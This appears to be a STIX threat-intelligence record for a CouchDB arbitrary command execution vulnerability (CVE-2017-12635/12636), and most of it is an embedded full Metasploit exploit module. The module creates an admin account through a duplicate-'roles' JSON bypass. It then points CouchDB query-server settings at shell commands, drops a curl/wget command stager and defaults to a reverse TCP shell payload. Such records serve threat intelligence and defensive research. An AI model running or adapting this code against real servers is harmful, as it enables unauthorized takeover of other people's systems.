{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77eafcfa-9fde-4b18-9e2f-a270ae6c0946",
    "created": "2024-08-14T17:01:37.736384Z",
    "modified": "2024-08-14T17:01:37.736389Z",
    "name": "Apache CouchDB Arbitrary Command Execution",
    "description": " CouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB. This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user including downloading and executing scripts from the public internet. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_couchdb_cmd_exec.rb",
            "external_id": "apache_couchdb_cmd_exec.rb"
        },
        {
            "source_name": "MaxJusticz",
            "external_id": "#CVE-2017-12635Vulnerabilitydiscovery"
        },
        {
            "source_name": "JoanTouzet",
            "external_id": "#CVE-2017-12636Vulnerabilitydiscovery"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-12636"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-12635"
        },
        {
            "source_name": "reference",
            "url": "https://justi.cz/security/2017/11/14/couchdb-rce-npm.html"
        },
        {
            "source_name": "reference",
            "url": "http://docs.couchdb.org/en/latest/cve/2017-12636.html"
        },
        {
            "source_name": "reference",
            "url": "https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache CouchDB Arbitrary Command Execution',\n      'Description'    => %q{\n        CouchDB administrative users can configure the database server via HTTP(S).\n        Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB.\n        This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user,\n        including downloading and executing scripts from the public internet.\n      },\n      'Author' => [\n        'Max Justicz',                       # CVE-2017-12635 Vulnerability discovery\n        'Joan Touzet',                       # CVE-2017-12636 Vulnerability discovery\n        'Green-m <greenm.xxoo[at]gmail.com>' # Metasploit module\n      ],\n      'References' => [\n        ['CVE', '2017-12636'],\n        ['CVE', '2017-12635'],\n        ['URL', 'https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],\n        ['URL', 'http://docs.couchdb.org/en/latest/cve/2017-12636.html'],\n        ['URL', 'https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E']\n      ],\n      'DisclosureDate' => '2016-04-06',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Privileged'     => false,\n      'DefaultOptions' => {\n        'PAYLOAD' => 'linux/x64/shell_reverse_tcp',\n        'CMDSTAGER::FLAVOR' => 'curl'\n      },\n      'CmdStagerFlavor' => ['curl', 'wget'],\n      'Targets' => [\n        ['Automatic',                  {}],\n        ['Apache CouchDB version 1.x', {}],\n        ['Apache CouchDB version 2.x', {}]\n      ],\n      'DefaultTarget' => 0\n    ))\n\n    register_options([\n      Opt::RPORT(5984),\n      OptString.new('URIPATH', [false, 'The URI to use for this exploit to download and execute. (default is random)']),\n      OptString.new('HttpUsername', [false, 'The username to login as']),\n      OptString.new('HttpPassword', [false, 'The password to login with'])\n    ])\n\n    register_advanced_options([\n      OptInt.new('Attempts', [false, 'The number of attempts to execute the payload.']),\n      OptString.new('WritableDir', [true, 'Writable directory to write temporary payload on disk.', '/tmp'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    get_version\n    return CheckCode::Unknown if @version.nil?\n    version = Rex::Version.new(@version)\n    return CheckCode::Unknown if version.version.empty?\n    vprint_status \"Found CouchDB version #{version}\"\n\n    return CheckCode::Appears if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    fail_with(Failure::Unknown, \"Something went horribly wrong and we couldn't continue to exploit.\") unless get_version\n    version = @version\n\n    vprint_good(\"#{peer} - Authorization bypass successful\") if auth_bypass\n\n    print_status(\"Generating #{datastore['CMDSTAGER::FLAVOR']} command stager\")\n    @cmdstager = generate_cmdstager(\n      temp: datastore['WritableDir'],\n      file: File.basename(cmdstager_path)\n    ).join(';')\n\n    register_file_for_cleanup(cmdstager_path)\n\n    if !datastore['Attempts'] || datastore['Attempts'] <= 0\n      attempts = 1\n    else\n      attempts = datastore['Attempts']\n    end\n\n    attempts.times do |i|\n      print_status(\"#{peer} - The #{i + 1} time to exploit\")\n      send_payload(version)\n      Rex.sleep(5)\n      # break if we get the shell\n      break if session_created?\n    end\n  end\n\n  # CVE-2017-12635\n  # The JSON parser differences result in behaviour that if two 'roles' keys are available in the JSON,\n  # the second one will be used for authorising the document write, but the first 'roles' key is used for subsequent authorization\n  # for the newly created user.\n  def auth_bypass\n    username = datastore['HttpUsername'] || Rex::Text.rand_text_alpha_lower(4..12)\n    password = datastore['HttpPassword'] || Rex::Text.rand_text_alpha_lower(4..12)\n    @auth = basic_auth(username, password)\n\n    res = send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/_users/org.couchdb.user:#{username}\"),\n      'method'        => 'PUT',\n      'ctype'         => 'application/json',\n      'data'          => %({\"type\": \"user\",\"name\": \"#{username}\",\"roles\": [\"_admin\"],\"roles\": [],\"password\": \"#{password}\"})\n    )\n\n    if res && (res.code == 200 || res.code == 201) && res.get_json_document['ok']\n      return true\n    else\n      return false\n    end\n  end\n\n  def get_version\n    @version = nil\n\n    begin\n      res = send_request_cgi(\n        'uri'           => normalize_uri(target_uri.path),\n        'method'        => 'GET',\n        'authorization' => @auth\n      )\n    rescue Rex::ConnectionError\n      vprint_bad(\"#{peer} - Connection failed\")\n      return false\n    end\n\n    unless res\n      vprint_bad(\"#{peer} - No response, check if it is CouchDB. \")\n      return false\n    end\n\n    if res && res.code == 401\n      print_bad(\"#{peer} - Authentication required.\")\n      return false\n    end\n\n    if res && res.code == 200\n      res_json = res.get_json_document\n\n      if res_json.empty?\n        vprint_bad(\"#{peer} - Cannot parse the response, seems like it's not CouchDB.\")\n        return false\n      end\n\n      @version = res_json['version'] if res_json['version']\n      return true\n    end\n\n    vprint_warning(\"#{peer} - Version not found\")\n    return true\n  end\n\n  def send_payload(version)\n    vprint_status(\"#{peer} - CouchDB version is #{version}\") if version\n\n    version = Rex::Version.new(@version)\n    if version.version.empty?\n      vprint_warning(\"#{peer} - Cannot retrieve the version of CouchDB.\")\n      # if target set Automatic, exploit failed.\n      if target == targets[0]\n        fail_with(Failure::NoTarget, \"#{peer} - Couldn't retrieve the version automaticly, set the target manually and try again.\")\n      elsif target == targets[1]\n        payload1\n      elsif target == targets[2]\n        payload2\n      end\n    elsif version < Rex::Version.new('1.7.0')\n      payload1\n    elsif version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))\n      payload2\n    elsif version >= Rex::Version.new('1.7.0') || Rex::Version.new('2.1.0')\n      fail_with(Failure::NotVulnerable, \"#{peer} - The target is not vulnerable.\")\n    end\n  end\n\n  # Exploit with multi requests\n  # payload1 is for the version of couchdb below 1.7.0\n  def payload1\n    rand_cmd1 = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_cmd2 = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_db = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_doc = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_hex = Rex::Text.rand_text_hex(32)\n    rand_file = \"#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8..16)}\"\n\n    register_file_for_cleanup(rand_file)\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/_config/query_servers/#{rand_cmd1}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'data'          => %(\"echo '#{@cmdstager}' > #{rand_file}\")\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}/#{rand_doc}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'data'          => %({\"_id\": \"#{rand_hex}\"})\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}/_temp_view?limit=20\"),\n      'method'        => 'POST',\n      'authorization' => @auth,\n      'ctype'         => 'application/json',\n      'data'          => %({\"language\":\"#{rand_cmd1}\",\"map\":\"\"})\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/_config/query_servers/#{rand_cmd2}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'data'          => %(\"/bin/sh #{rand_file}\")\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}/_temp_view?limit=20\"),\n      'method'        => 'POST',\n      'authorization' => @auth,\n      'ctype'         => 'application/json',\n      'data'          => %({\"language\":\"#{rand_cmd2}\",\"map\":\"\"})\n    )\n  end\n\n  # payload2 is for the version of couchdb below 2.1.1\n  def payload2\n    rand_cmd1 = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_cmd2 = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_db = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_doc = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_tmp = Rex::Text.rand_text_alpha_lower(4..12)\n    rand_hex = Rex::Text.rand_text_hex(32)\n    rand_file = \"#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8..16)}\"\n\n    register_file_for_cleanup(rand_file)\n\n    res = send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/_membership\"),\n      'method'        => 'GET',\n      'authorization' => @auth\n    )\n\n    node = res.get_json_document['all_nodes'][0]\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/_node/#{node}/_config/query_servers/#{rand_cmd1}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'data'          => %(\"echo '#{@cmdstager}' > #{rand_file}\")\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}/#{rand_doc}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'data'          => %({\"_id\": \"#{rand_hex}\"})\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}/_design/#{rand_tmp}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'ctype'         => 'application/json',\n      'data'          => %({\"_id\":\"_design/#{rand_tmp}\",\"views\":{\"#{rand_db}\":{\"map\":\"\"} },\"language\":\"#{rand_cmd1}\"})\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/_node/#{node}/_config/query_servers/#{rand_cmd2}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'data'          => %(\"/bin/sh #{rand_file}\")\n    )\n\n    send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path, \"/#{rand_db}/_design/#{rand_tmp}\"),\n      'method'        => 'PUT',\n      'authorization' => @auth,\n      'ctype'         => 'application/json',\n      'data'          => %({\"_id\":\"_design/#{rand_tmp}\",\"views\":{\"#{rand_db}\":{\"map\":\"\"} },\"language\":\"#{rand_cmd2}\"})\n    )\n  end\n\n  def cmdstager_path\n    @cmdstager_path ||=\n      \"#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8)}\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2016-04-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}